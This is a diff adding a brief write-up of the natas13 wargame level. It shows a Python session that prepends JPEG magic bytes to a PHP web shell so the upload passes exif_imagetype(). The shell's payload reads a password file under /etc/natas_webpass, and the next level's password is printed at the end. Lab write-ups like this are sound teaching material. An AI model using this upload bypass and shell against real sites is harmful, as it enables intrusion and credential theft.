@@ -1,0 +1,22 @@
+This challenge is really similar to natas12, although in this one it checks if it's an image that is being uploaded.
+
+The function exif_imagetype() reads the first bytes of an image and checks if it corresponds to its signature (magic bytes).
+
+So we need to think what can we do to bypass this check...
+
+Well, we can create a normal php file and add the jpeg magic bytes at the beggining, lets try it!
+
+To do that we'll do the following with python:
+
+Python 2.7.15+ (default, Aug 31 2018, 11:56:52) 
+[GCC 8.2.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> fh = open('shell.php', 'w')
+>>> fh.write('\xFF\xD8\xFF\xEE' + '<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>')
+>>> fh.close()
+
+
+Now let's try to upload it! Don't forget to change the file extension on burpsuite!
+
+
+Success! The key to next level is: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
